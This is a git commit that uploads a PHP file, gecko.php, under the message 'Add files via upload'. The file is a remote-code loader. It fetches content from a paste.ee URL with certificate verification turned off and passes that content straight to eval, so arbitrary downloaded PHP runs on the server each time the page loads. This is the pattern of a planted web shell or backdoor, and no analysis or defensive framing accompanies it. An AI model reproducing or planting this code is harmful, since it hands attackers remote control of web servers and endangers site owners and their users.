992f6606967b9c57e2b81c3861a2b81e53827c88
Leonardo Devon Aji Firmansyah <123180056+firmansec@users.noreply.github.com>
2023-12-06 15:20:27 +0000

    Add files via upload

---
+++ gecko.php
@@ -0,0 +1,17 @@
+<?php
+function getCurl0($url)
+{
+  if (function_exists("curl_init")) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+  }
+}
+?>
+
+<?=eval("?>".getCurl0("https://paste.ee/r/N8YrY/0")); __halt_compiler();?>
